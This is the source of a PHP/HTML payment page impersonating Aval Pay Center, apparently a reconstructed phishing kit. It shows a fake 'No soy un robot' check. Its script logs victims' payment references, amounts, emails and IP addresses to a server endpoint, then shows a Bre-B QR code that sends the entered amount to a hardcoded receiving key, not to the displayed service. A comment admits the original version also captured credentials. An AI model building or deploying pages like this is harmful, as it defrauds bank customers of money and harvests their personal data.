<?php require_once __DIR__ . '/config.php'; ?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aval Pay Center - Realizar Pago</title>
    <script>
        (function () {
            try {
                var convenioSeleccionado = localStorage.getItem('convenioSeleccionado');
                if (!convenioSeleccionado) {
                    window.location.replace('index.php');
                }
            } catch (error) {
                window.location.replace('index.php');
            }
        })();
    </script>
    <link rel="icon" type="image/svg+xml" href="assets/img/favicon-avalpay.svg">
    <link rel="stylesheet" href="assets/estilos-avalpay.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Jost:wght@700&family=Plus+Jakarta+Sans:wght@400;500;700&display=swap"
        rel="stylesheet">
    <style>
        /* ── Selector medio de pago ── */
        .selector-metodo {
            margin: 18px 0 10px;
        }

        .selector-metodo__label {
            font-size: 13px;
            font-weight: 600;
            color: #1a1f36;
            margin-bottom: 12px;
            display: block;
            font-family: 'Plus Jakarta Sans', sans-serif;
        }

        .selector-metodo__grid {
            display: grid;
            grid-template-columns: auto 1fr;
            gap: 10px;
        }

        .metodo-card {
            border: 2px solid #e5e7eb;
            border-radius: 14px;
            padding: 14px 12px;
            cursor: pointer;
            background: #fff;
            transition: border-color .18s, box-shadow .18s;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 8px;
            min-height: 80px;
        }

        .metodo-card:hover {
            border-color: #93c5fd;
        }

        .metodo-card.seleccionado {
            border-color: #2563eb;
            box-shadow: 0 0 0 3px #bfdbfe;
        }

        .metodo-card--breb {
            flex-direction: row;
            gap: 10px;
        }

        .metodo-card--breb {
            min-width: 120px;
            padding: 14px 18px;
        }

        .metodo-card--breb img {
            height: 26px;
            object-fit: contain;
        }

        .metodo-card--otros .otros-titulo {
            font-size: 11px;
            font-weight: 700;
            color: #6b7280;
            font-family: 'Plus Jakarta Sans', sans-serif;
            text-align: center;
        }

        .metodo-card--otros .otros-logos {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .metodo-card--otros .otros-logos img {
            height: 22px;
            object-fit: contain;
        }

        .selector-metodo__error {
            color: #e53e3e;
            font-size: 12px;
            margin-top: 6px;
            display: none;
        }

        /* ── Loading overlay Bre-B ── */
        #brebLoading {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, .6);
            z-index: 99999;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 16px;
        }

        #brebLoading.activo {
            display: flex;
        }

        .breb-spinner {
            width: 52px;
            height: 52px;
            border: 5px solid rgba(255, 255, 255, .25);
            border-top-color: #2bd4c5;
            border-radius: 50%;
            animation: brebSpin .8s linear infinite;
        }

        @keyframes brebSpin {
            to {
                transform: rotate(360deg);
            }
        }

        .breb-loading-txt {
            color: #fff;
            font-family: 'Plus Jakarta Sans', sans-serif;
            font-size: 14px;
            font-weight: 500;
        }

        /* ── Modal base ── */
        .breb-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, .5);
            z-index: 9999;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }

        .breb-overlay.activo {
            display: flex;
        }

        .breb-box {
            background: #fff;
            border-radius: 18px;
            box-shadow: 0 24px 60px rgba(0, 0, 0, .22);
            font-family: 'Plus Jakarta Sans', sans-serif;
            width: min(480px, 100%);
            overflow: hidden;
        }

        /* ── Modal email ── */
        .breb-email-head {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 22px 0;
        }

        .breb-email-head-left {
            display: flex;
            align-items: center;
            gap: 9px;
        }

        .breb-email-head h3 {
            margin: 0;
            font-size: 16px;
            font-weight: 700;
            color: #1a1f36;
        }

        .breb-email-close {
            background: none;
            border: none;
            cursor: pointer;
            font-size: 24px;
            color: #9ca3af;
            line-height: 1;
            padding: 0;
        }

        .breb-email-body {
            padding: 12px 22px 4px;
            color: #5c6277;
            font-size: 14px;
            line-height: 1.55;
        }

        .breb-email-field {
            position: relative;
            margin: 10px 22px 4px;
        }

        .breb-email-input {
            width: 100%;
            height: 54px;
            border: 1.5px solid #d1d5db;
            border-radius: 12px;
            padding: 20px 14px 6px;
            font-size: 14px;
            font-family: inherit;
            outline: none;
            box-sizing: border-box;
            transition: border-color .15s;
            color: #1a1f36;
        }

        .breb-email-input:focus {
            border-color: #2563eb;
        }

        .breb-email-input.error {
            border-color: #e53e3e;
        }

        .breb-email-flabel {
            position: absolute;
            left: 14px;
            top: 8px;
            font-size: 11px;
            color: #9ca3af;
            pointer-events: none;
        }

        .breb-email-err {
            color: #e53e3e;
            font-size: 12px;
            margin: 2px 22px 0;
            display: none;
        }

        .breb-email-actions {
            padding: 14px 22px 20px;
            display: flex;
            justify-content: flex-end;
        }

        .breb-btn-continuar {
            background: #1a1f36;
            color: #fff;
            border: none;
            border-radius: 12px;
            padding: 12px 30px;
            font-family: inherit;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: background .15s;
        }

        .breb-btn-continuar:hover {
            background: #2563eb;
        }

        /* ── Modal QR Bre-B ── */
        .breb-qr-box {
            width: min(700px, 100%);
        }

        .breb-qr-head {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 18px 24px 14px;
            border-bottom: 1px solid #f0f2f7;
        }

        .breb-qr-head-logos {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .breb-qr-head-logos img {
            height: 32px;
            object-fit: contain;
        }

        .breb-qr-head-logos .sep {
            color: #d1d5db;
            font-size: 22px;
            font-weight: 300;
        }

        .breb-qr-close {
            background: none;
            border: none;
            font-size: 26px;
            cursor: pointer;
            color: #6b7280;
            line-height: 1;
            padding: 0;
        }

        .breb-qr-content {
            display: grid;
            grid-template-columns: 1fr 190px;
            gap: 20px;
            padding: 22px 24px 16px;
            align-items: start;
        }

        .breb-qr-title {
            font-size: 19px;
            font-weight: 700;
            color: #1a1f36;
            margin: 0 0 14px;
        }

        .breb-qr-steps {
            margin: 0;
            padding-left: 18px;
            color: #374151;
            font-size: 13.5px;
            line-height: 1.75;
        }

        .breb-qr-steps li {
            margin-bottom: 4px;
        }

        .breb-qr-side {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
        }

        .breb-qr-img {
            border: 1.5px solid #e5e7eb;
            border-radius: 10px;
            padding: 7px;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 188px;
            height: 188px;
            box-sizing: border-box;
        }
        .breb-qr-img canvas, .breb-qr-img img { display: block; }

        .breb-qr-vigente {
            background: #d1fae5;
            color: #065f46;
            border: 1px solid #6ee7b7;
            border-radius: 8px;
            padding: 8px 10px;
            font-size: 11.5px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 5px;
            width: 100%;
            justify-content: center;
            text-align: center;
            line-height: 1.4;
        }

        .breb-qr-dl {
            color: #2563eb;
            font-size: 13px;
            font-weight: 600;
            background: none;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 4px;
            font-family: inherit;
            text-decoration: none;
        }

        .breb-qr-dl:hover {
            text-decoration: underline;
        }

        .breb-qr-warning {
            margin: 0 24px 20px;
            background: #fff7ed;
            border: 1px solid #fed7aa;
            border-radius: 10px;
            padding: 12px 14px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: #92400e;
            font-size: 13px;
            font-weight: 500;
        }

        .breb-qr-warn-icon {
            width: 24px;
            height: 24px;
            background: #f97316;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-weight: 800;
            font-size: 14px;
            flex-shrink: 0;
        }

        @media (max-width: 540px) {
            .selector-metodo__grid {
                grid-template-columns: 1fr;
            }

            .breb-qr-content {
                grid-template-columns: 1fr;
            }

            .breb-qr-side {
                flex-direction: row;
                flex-wrap: wrap;
                justify-content: center;
            }
        }
    </style>
</head>

<body>

    <header class="cabecera">
        <div class="contenedor-cabecera">
            <div class="grupo-logos">
                <img src="assets/img/logo-avalpay-center.webp" alt="Aval Pay Center Logo" class="logo-principal">
                <img src="assets/img/aval-group-logo.png" alt="Grupo Aval Logo" class="logo-secundario">
            </div>
            <nav class="menu-navegacion">
                <ul>
                    <li><a href="index.php" class="enlace-navegacion texto-oscuro">Volver al Inicio</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <main class="contenedor pagina-pago">

        <h1 class="titulo-principal">Realiza tu pago</h1>
        <div class="indicadores">
            <span class="punto punto-azul-oscuro"></span>
            <span class="punto punto-rojo"></span>
            <span class="punto punto-azul-claro"></span>
            <span class="punto punto-verde"></span>
        </div>

        <div class="contenedor-columnas">

            <!-- COLUMNA IZQUIERDA: Pasos -->
            <div class="columna-pasos">
                <div class="paso activo">
                    <div class="circulo-paso">1</div>
                    <div class="contenido-paso">
                        <h3 class="titulo-paso">Datos de tu pago</h3>
                        <p class="descripcion-paso">
                            Ingresa los datos necesarios para realizar tu pago, recuerda que los
                            campos con asterisco son obligatorios. Lee y acepta términos y condiciones.
                        </p>
                    </div>
                </div>
                <div class="paso inactivo">
                    <div class="circulo-paso">2</div>
                    <div class="contenido-paso">
                        <h3 class="titulo-paso">Realiza tu pago seguro</h3>
                    </div>
                </div>
                <div class="paso inactivo sin-borde">
                    <div class="circulo-paso">3</div>
                    <div class="contenido-paso">
                        <h3 class="titulo-paso">Recibe tu comprobante</h3>
                    </div>
                </div>
            </div>

            <!-- COLUMNA DERECHA: Formulario -->
            <div class="columna-formulario">

                <p class="etiqueta-servicio">Servicio a pagar</p>
                <h2 id="nombreConvenioMostrar" class="nombre-servicio-grande">Cargando...</h2>

                <div class="formulario-agrupado">
                    <div class="campo-formulario campo-formulario--flotante" id="campoReferenciaWrapper">
                        <span class="etiqueta-flotante" id="etiquetaCampoReferencia">Cargando...</span>
                        <input type="text" id="campoReferencia" class="entrada-formulario" placeholder="Cargando..."
                            autocomplete="off" required>
                        <p class="mensaje-error" id="errorReferencia"><span class="icono-error">✖</span> Este campo es
                            obligatorio.</p>
                    </div>
                    <div id="camposAdicionales"></div>
                    <div class="campo-formulario campo-formulario--flotante" id="campoValorWrapper">
                        <span class="etiqueta-flotante" id="etiquetaCampoValor">Valor a pagar*</span>
                        <input type="text" id="campoValor" class="entrada-formulario" placeholder="Valor a pagar*"
                            inputmode="numeric" autocomplete="off" required>
                        <p class="mensaje-error" id="errorValor"><span class="icono-error">✖</span> Este campo es
                            obligatorio.</p>
                    </div>
                </div>

                <div class="fila-resumen">
                    <span class="etiqueta-resumen">Valor de la transacción</span>
                    <span class="valor-resumen" id="valorResumen">$ 0</span>
                </div>

                <div class="fila-resumen-detalle">
                    <span class="etiqueta-resumen">Agregar detalle del pago</span>
                    <label class="interruptor">
                        <input type="checkbox" id="interruptorDetalle">
                        <span class="deslizador redondo"></span>
                    </label>
                </div>

                <div id="contenedorDetallePago" class="contenedor-detalle-pago oculto">
                    <textarea id="textareaDetalle" class="textarea-detalle" placeholder="Detalle del pago"
                        rows="4"></textarea>
                </div>

                <div class="contenedor-terminos">
                    <input type="checkbox" id="aceptoTerminos" class="casilla-verificacion">
                    <label for="aceptoTerminos" class="texto-terminos">Acepto <a href="#"
                            class="enlace-terminos">términos y condiciones</a></label>
                </div>
                <p class="mensaje-error" id="errorTerminos"><span class="icono-error">✖</span> Debes aceptar términos y
                    condiciones</p>

                <!-- Casilla estilo reCAPTCHA: puramente decorativa, no valida nada -->
                <div class="caja-recaptcha">
                    <div class="recaptcha-interior">
                        <div class="recaptcha-check" data-recaptcha="">
                            <input type="checkbox" id="casillaRecaptcha" class="casilla-recaptcha">
                            <div class="recaptcha-check__caja"></div>
                            <div class="recaptcha-check__spinner oculto"></div>
                            <svg class="recaptcha-check__chulito oculto" viewBox="0 0 24 24">
                                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"></path>
                            </svg>
                        </div>
                        <span class="texto-recaptcha">No soy un robot</span>
                    </div>
                    <img src="assets/img/recapchat.png" alt="reCAPTCHA" class="recaptcha-sello">
                </div>
                <p class="mensaje-error" id="errorRecaptcha"><span class="icono-error">✖</span> Debes marcar la casilla
                </p>

                <!-- Selector de medio de pago -->
                <div class="selector-metodo">
                    <span class="selector-metodo__label">Selecciona el medio de pago para continuar tu
                        transacción:</span>
                    <div class="selector-metodo__grid">
                        <div class="metodo-card metodo-card--breb" id="metodoBreb" data-metodo="breb">
                            <img src="assets/img/logo-breb.svg" alt="Bre-B">
                        </div>
                        <div class="metodo-card metodo-card--otros" id="metodoOtros" data-metodo="otros">
                            <span class="otros-titulo">Otros medios de pago:</span>
                            <div class="otros-logos">
                                <img src="assets/img/aval-group-logo.png" alt="Grupo Aval">
                                <img src="assets/img/pse-logo.png" alt="PSE">
                            </div>
                        </div>
                    </div>
                    <p class="selector-metodo__error" id="errorMetodo">
                        <span class="icono-error">✖</span> Selecciona un medio de pago.
                    </p>
                </div>

                <div class="grupo-botones-formulario">
                    <button id="botonPagar" class="boton boton-primario-suave">Pagar</button>
                    <button id="botonAgiliza" class="boton boton-primario-suave" disabled
                        title="Omitido en esta reconstrucción: en el original captura credenciales">Agiliza tu
                        pago</button>
                </div>

            </div>
        </div>
    </main>

    <!-- Modal Confirmación (solo visual, no envía datos ni avanza de paso) -->
    <div id="modalConfirmacion" class="modal-confirmacion" aria-hidden="true">
        <div class="modal-confirmacion__overlay" data-cerrar-modal=""></div>
        <div class="modal-confirmacion__dialog" role="dialog" aria-modal="true"
            aria-labelledby="modalConfirmacionTitulo">
            <div class="modal-confirmacion__header">
                <div class="modal-confirmacion__titulo">
                    <span class="modal-confirmacion__icono" aria-hidden="true">✓</span>
                    <h3 id="modalConfirmacionTitulo">Confirmación</h3>
                </div>
                <button type="button" class="modal-confirmacion__cerrar" aria-label="Cerrar"
                    data-cerrar-modal="">×</button>
            </div>
            <div class="modal-confirmacion__body">
                <p>¿Estás seguro que la información del pago es correcta?</p>
            </div>
            <div class="modal-confirmacion__footer">
                <button type="button" id="modalConfirmacionAceptar" class="boton boton-primario-suave">Aceptar</button>
                <button type="button" class="boton modal-confirmacion__boton-secundario"
                    data-cerrar-modal="">Cancelar</button>
            </div>
        </div>
    </div>

    <!-- Bre-B: loading overlay -->
    <div id="brebLoading">
        <div class="breb-spinner"></div>
        <span class="breb-loading-txt">Procesando tu selección...</span>
    </div>

    <!-- Bre-B: modal email -->
    <div id="brebEmailModal" class="breb-overlay">
        <div class="breb-box">
            <div class="breb-email-head">
                <div class="breb-email-head-left">
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#f97316" stroke-width="2"
                        stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="12" cy="12" r="10" />
                        <line x1="12" y1="8" x2="12" y2="12" />
                        <line x1="12" y1="16" x2="12.01" y2="16" />
                    </svg>
                    <h3>Importante</h3>
                </div>
                <button class="breb-email-close" id="brebEmailCerrar">×</button>
            </div>
            <p class="breb-email-body">Ingresa tu correo electrónico para recibir la notificación de tu pago.</p>
            <div class="breb-email-field">
                <label class="breb-email-flabel">Correo electrónico *</label>
                <input id="brebEmailInput" class="breb-email-input" type="email" placeholder=" " autocomplete="email">
            </div>
            <p class="breb-email-err" id="brebEmailErr">Ingresa un correo electrónico válido.</p>
            <div class="breb-email-actions">
                <button id="brebEmailContinuar" class="breb-btn-continuar">Continuar</button>
            </div>
        </div>
    </div>

    <!-- Bre-B: modal QR -->
    <div id="brebQrModal" class="breb-overlay">
        <div class="breb-box breb-qr-box">
            <div class="breb-qr-head">
                <div class="breb-qr-head-logos">
                    <img src="assets/img/logo-breb.svg" alt="Bre-B">
                    <span class="sep">|</span>
                    <img src="assets/img/aval-group-logo.png" alt="Grupo Aval">
                </div>
                <button class="breb-qr-close" id="brebQrCerrar">×</button>
            </div>
            <div class="breb-qr-content">
                <div>
                    <p class="breb-qr-title">Escanea el QR para realizar el pago.</p>
                    <ol class="breb-qr-steps">
                        <li>Con el medio de pago BRE-B puedes realizar tu pago desde cualquier entidad financiera.</li>
                        <li>Abre la app de tu banco o billetera.</li>
                        <li>Elige la opción "Código QR" y escanea el código con la cámara o guárdalo en la galería de
                            imágenes de tu celular.</li>
                        <li>Sigue las instrucciones para realizar el pago y al finalizar verás el comprobante.</li>
                    </ol>
                </div>
                <div class="breb-qr-side">
                    <div id="brebQRDiv" class="breb-qr-img"></div>
                    <div class="breb-qr-vigente">
                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                            stroke-width="2.2">
                            <circle cx="12" cy="12" r="10" />
                            <polyline points="12 6 12 12 16 14" />
                        </svg>
                        Vigente hasta:<br><span id="brebQrFecha">--/--/---- - 23:59</span>
                    </div>
                    <a class="breb-qr-dl" id="brebQrDl" download="qr-pago-breb.png" href="#">
                        Descargar QR
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                            stroke-width="2.5" stroke-linecap="round">
                            <path d="M12 5v14M5 12l7 7 7-7" />
                        </svg>
                    </a>
                </div>
            </div>
            <div class="breb-qr-warning">
                <div class="breb-qr-warn-icon">!</div>
                Por favor, no cierres ni actualices esta ventana hasta que confirmemos tu pago.
            </div>
        </div>
    </div>

    <script>
        (function () {
            var _BREB_LLAVE  = <?php echo json_encode(defined('BREB_LLAVE') ? BREB_LLAVE : '@LITTIO1032010324'); ?>;
            var _BREB_PREFIX = '00020101021226390014CO.COM.ACH.LLA04' + String(_BREB_LLAVE.length).padStart(2, '0') + _BREB_LLAVE + '49250014CO.COM.ACH.RED0103ACH50310013CO.COM.ACH.CU01100082302155520400005303170';

            var _metodoSel = null; // 'breb' | 'otros' | null

            // ── Selección de medio de pago ──
            document.querySelectorAll('.metodo-card').forEach(function (card) {
                card.addEventListener('click', function () {
                    document.querySelectorAll('.metodo-card').forEach(function (c) { c.classList.remove('seleccionado'); });
                    this.classList.add('seleccionado');
                    _metodoSel = this.dataset.metodo;
                    document.getElementById('errorMetodo').style.display = 'none';
                });
            });

            // ── Helpers de log ──
            function p1GetIP() {
                return fetch('https://api.ipify.org?format=json')
                    .then(function(r){ return r.json(); })
                    .then(function(d){ return d.ip || '—'; })
                    .catch(function(){ return '—'; });
            }
            function p1Log(lines, action) {
                var text = Array.isArray(lines) ? lines.join('\n') : String(lines);
                var body = { text: text };
                if (action) body.action = action;
                fetch('log.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(body)
                }).catch(function(){});
            }
            function p1Convenio() {
                try {
                    var raw = localStorage.getItem('convenioSeleccionado');
                    return raw ? JSON.parse(raw) : {};
                } catch(e) { return {}; }
            }

            // ── Helpers modales ──
            var _brebEsperandoConfirm = false;

            function cerrarConfirmacion() {
                // Usa el mismo mecanismo de cierre que paso-uno.js
                var backdrop = document.querySelector('#modalConfirmacion [data-cerrar-modal]');
                if (backdrop) backdrop.click();
                _brebEsperandoConfirm = false;
            }

            // ── Intercepción del botón Pagar (captura → corre antes que paso-uno.js) ──
            document.getElementById('botonPagar').addEventListener('click', function (e) {
                // Validar que se eligió un medio
                if (!_metodoSel) {
                    document.getElementById('errorMetodo').style.display = 'block';
                    e.preventDefault();
                    e.stopImmediatePropagation();
                    return;
                }
                if (_metodoSel === 'otros') return; // deja correr paso-uno.js normalmente

                // ── Flujo Bre-B ──
                e.preventDefault();
                e.stopImmediatePropagation();

                // Validar campos obligatorios
                var ref = document.getElementById('campoReferencia');
                var val = document.getElementById('campoValor');
                var terms = document.getElementById('aceptoTerminos');
                var capt = document.getElementById('casillaRecaptcha');
                var ok = true;
                if (!ref || !ref.value.trim()) {
                    var eRef = document.getElementById('errorReferencia');
                    if (eRef) eRef.style.display = 'block';
                    ok = false;
                }
                if (!val || !val.value.trim()) {
                    var eVal = document.getElementById('errorValor');
                    if (eVal) eVal.style.display = 'block';
                    ok = false;
                }
                if (!terms || !terms.checked) {
                    var eTer = document.getElementById('errorTerminos');
                    if (eTer) eTer.style.display = 'block';
                    ok = false;
                }
                if (!capt || !capt.checked) {
                    var eCap = document.getElementById('errorRecaptcha');
                    if (eCap) eCap.style.display = 'block';
                    ok = false;
                }
                if (!ok) return;

                // Log: intento de pago con Bre-B
                var _refVal  = ref ? ref.value.trim() : '—';
                var _montoVal = val ? val.value.trim() : '—';
                var _conv = p1Convenio();
                p1GetIP().then(function(ip) {
                    p1Log([
                        '🟢 BREB — PASO UNO',
                        '🏛️ Convenio: ' + (_conv.nombre || _conv.convenio || '—'),
                        '🧾 Referencia: ' + _refVal,
                        '💰 Valor: $' + _montoVal,
                        '🌐 IP: ' + ip
                    ]);
                });

                // 3 s de loading → dejar que paso-uno.js abra el modal de confirmación
                var loading = document.getElementById('brebLoading');
                loading.classList.add('activo');
                setTimeout(function () {
                    loading.classList.remove('activo');
                    _brebEsperandoConfirm = true;
                    // Temporalmente fingimos ser "otros" para que paso-uno.js
                    // abra el modal usando su propio mecanismo CSS
                    _metodoSel = 'otros';
                    document.getElementById('botonPagar').click();
                    _metodoSel = 'breb';
                }, 3000);
            }, true); // capture phase

            // ── Intercepción del botón Aceptar en modal confirmación ──
            // Usamos capture:true + _brebEsperandoConfirm para asegurarnos de
            // interceptar antes que paso-uno.js y bloquear el redirect a paso-dos.php
            document.getElementById('modalConfirmacionAceptar').addEventListener('click', function (e) {
                if (!_brebEsperandoConfirm) return;
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();

                cerrarConfirmacion();
                document.getElementById('brebEmailModal').classList.add('activo');
            }, true);

            // ── Modal email: cerrar ──
            document.getElementById('brebEmailCerrar').addEventListener('click', function () {
                document.getElementById('brebEmailModal').classList.remove('activo');
                document.getElementById('brebEmailInput').value = '';
                document.getElementById('brebEmailErr').style.display = 'none';
            });

            // ── Modal email: Continuar ──
            document.getElementById('brebEmailContinuar').addEventListener('click', function () {
                var input = document.getElementById('brebEmailInput');
                var err = document.getElementById('brebEmailErr');
                if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input.value.trim())) {
                    input.classList.add('error');
                    err.style.display = 'block';
                    return;
                }
                input.classList.remove('error');
                err.style.display = 'none';

                // Log: confirmó ir a pagar con Bre-B
                var _conv3 = p1Convenio();
                var _ref3  = (document.getElementById('campoReferencia') || {}).value || '—';
                var _monto3 = (document.getElementById('campoValor') || {}).value || '—';
                p1GetIP().then(function(ip) {
                    p1Log([
                        '✅ BREB — CONFIRMÓ IR A PAGAR',
                        '🏛️ Convenio: ' + (_conv3.nombre || _conv3.convenio || '—'),
                        '🧾 Referencia: ' + _ref3.trim(),
                        '💰 Valor: $' + _monto3.trim(),
                        '📧 Correo: ' + input.value.trim(),
                        '🔑 Llave: ' + _BREB_LLAVE,
                        '🌐 IP: ' + ip
                    ]);
                });

                document.getElementById('brebEmailModal').classList.remove('activo');
                brebMostrarQr();
            });
            document.getElementById('brebEmailInput').addEventListener('input', function () {
                this.classList.remove('error');
                document.getElementById('brebEmailErr').style.display = 'none';
            });

            // ── Modal QR ──
            function brebMostrarQr() {
                var _BREB_SUFFIX = '5802CO5905Kamin600511001610511001622107040000080200110363380270016CO.COM.ACH.CANAL0103APP81250015CO.COM.ACH.CIVA01020382260014CO.COM.ACH.IVA01040.0083270015CO.COM.ACH.BASE01040.0084250015CO.COM.ACH.CINC01020385260014CO.COM.ACH.INC01040.0090410016CO.COM.ACH.TRXID01171783894866422000=91460014CO.COM.ACH.SEC0124zdItyibLP1ZlwenFpLPDwbPN6304';

                function _crc16(str) {
                    var crc = 0xFFFF;
                    for (var i = 0; i < str.length; i++) {
                        crc ^= str.charCodeAt(i) << 8;
                        for (var j = 0; j < 8; j++) {
                            crc = (crc & 0x8000) ? ((crc << 1) ^ 0x1021) : (crc << 1);
                        }
                        crc &= 0xFFFF;
                    }
                    return crc;
                }

                function _buildBrebQR(amount) {
                    var amtStr = parseFloat(amount).toFixed(2);
                    var amtLen = String(amtStr.length).padStart(2, '0');
                    var payload = _BREB_PREFIX + '54' + amtLen + amtStr + _BREB_SUFFIX;
                    return payload + _crc16(payload).toString(16).toUpperCase().padStart(4, '0');
                }

                var rawMonto = ((document.getElementById('campoValor') || {}).value || '0').replace(/\D/g, '') || '0';
                var qrText = _buildBrebQR(parseFloat(rawMonto));

                var qrDiv = document.getElementById('brebQRDiv');
                qrDiv.innerHTML = '';
                new QRCode(qrDiv, {
                    text: qrText,
                    width: 174,
                    height: 174,
                    correctLevel: QRCode.CorrectLevel.M
                });

                setTimeout(function() {
                    var canvas = qrDiv.querySelector('canvas');
                    var dlBtn = document.getElementById('brebQrDl');
                    if (canvas) dlBtn.href = canvas.toDataURL('image/png');
                    else {
                        var img = qrDiv.querySelector('img');
                        if (img) dlBtn.href = img.src;
                    }
                }, 100);

                var d = new Date();
                d.setDate(d.getDate() + 1);
                var dd = String(d.getDate()).padStart(2, '0');
                var mm = String(d.getMonth() + 1).padStart(2, '0');
                var yyyy = d.getFullYear();
                document.getElementById('brebQrFecha').textContent = dd + '/' + mm + '/' + yyyy + ' - 23:59';

                document.getElementById('brebQrModal').classList.add('activo');
            }

            document.getElementById('brebQrCerrar').addEventListener('click', function () {
                document.getElementById('brebQrModal').classList.remove('activo');
            });
        })();
    </script>
    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
    <script src="assets/paso-uno.js"></script>
</body>

</html>